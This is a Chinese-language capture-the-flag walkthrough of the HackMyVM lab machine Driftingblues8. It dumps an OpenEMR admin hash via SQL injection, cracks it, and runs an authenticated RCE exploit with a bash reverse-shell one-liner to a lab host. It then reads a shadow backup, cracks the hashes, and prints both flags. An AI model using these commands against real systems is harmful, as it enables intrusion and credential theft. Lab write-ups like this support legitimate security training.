# Driftingblues8

2024-12-28 https://hackmyvm.eu/machines/machine.php?vm=Driftingblues8

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

只有一个 web 服务，首页显示的 CMS 是 OpenEMR，对其进行目录扫描，发现 http://192.168.5.40/admin.php 页面了，其版本为 5.0.1 (3)，找到几个漏洞利用，但是都需要用户凭据，目前没有：

```
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)         | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)     | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                            | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                             | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                             | php/webapps/45161.py
```

在找找其他的利用吧，msf 中有一个 sql 注入的利用，auxiliary/sqli/openemr/openemr_sqli_dump ：

```
set rhosts 192.168.5.40
set TARGETURI /
run
```

最终跑出用户 admin 的密码：

```
+--------------------------------------------------------------+----------+
| password                                                     | username |
+--------------------------------------------------------------+----------+
| $2a$05$.tDgmjTxSmOz8ena6MnN3.2E049sE5jUaknc7aRqOOdQHLX61F.p. | admin    |
+--------------------------------------------------------------+----------+
```

在前面的目录扫描中还发现了一个http://192.168.5.40/wordlist.txt 其中是字典列表。`$2a$` 在 hashcat 中的模式是 3200，使用刚才得到的字典进行破解，得到结果：

```
2a$05$.tDgmjTxSmOz8ena6MnN3.2E049sE5jUaknc7aRqOOdQHLX61F.p.:$HEX[2e3a2e79617272616b2e3a2e3331]
```

将 2e3a2e79617272616b2e3a2e3331 进行十六进制转 10 进制，得到密码：`.:.yarrak.:.31`

然后利用前面找到的 RCE 利用 45161.py，使用 python2 运行：

```
python2 45161.py -u admin -p '.:.yarrak.:.31' -c '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40
```

在 kali 上得到了反弹的 shell。

在 home 目录中有一个用户 clapton，但是没权限访问，发现数据库的连接配置文件:

```
cat sites/default/sqlconf.php

$host	= 'localhost';
$port	= '3306';
$login	= 'openemr';
$pass	= 'junno';
$dbase	= 'openemr';
```

但是这个密码不对，尝试其他枚举，sudo、suid、getcap、crontab 等都没发现可利用的地方。发现了一个可读的 shadow 备份文件：/var/backups/shadow.backup：

```
root:$6$sqBC8Bk02qmul3ER$kysvb1LR5uywwKRc/KQcmOMALcqd0NhHnU1Wbr9NRs9iz7WHwWqGkxKYRhadI3FWo3csX1BdQPHg33gwGVgMp.:18742:0:99999:7:::
clapton:$6$/eeR7/4JGbeM7nwc$hANgsvO09hCCMkV5HiWsjTTS7NMOZ4tm8/s4uzyZxLau2CSX7eEwjgcbfwcdvLV.XccVW5QuysP/9JBjMkdXT/:18742:0:99999:7:::
```

使用前面的 wordlist 爆破没成功，最后使用 rockyou 进行爆破得到密码 dragonsblood , 切换到 clapton 用户。

得到了 user flag：

```
clapton@driftingblues:~$ cat user.txt
96716B8151B1682C5285BC99DD4E95C2
```

同时在 home 目录中也有一个 suid 程序 waytoroot，但是没看出利用信息。同时这个目录中还有一个 wordlist.txt 文件。将这个文件传输到 kali 上，看看它能不能破解出 root 的密码。

最终找到了 root 的密码：

```
$6$sqBC8Bk02qmul3ER$kysvb1LR5uywwKRc/KQcmOMALcqd0NhHnU1Wbr9NRs9iz7WHwWqGkxKYRhadI3FWo3csX1BdQPHg33gwGVgMp.:$HEX[2e3a2e796172616b2e3a2e]
```

将其从十六进制转换成字符串，得到密码为: `.:.yarak.:.`

最终获得 root flag：

```
root@driftingblues:~# ls
root.txt
root@driftingblues:~# cat root.txt
E8E7040D825E1F345A617E0E6612444A
```
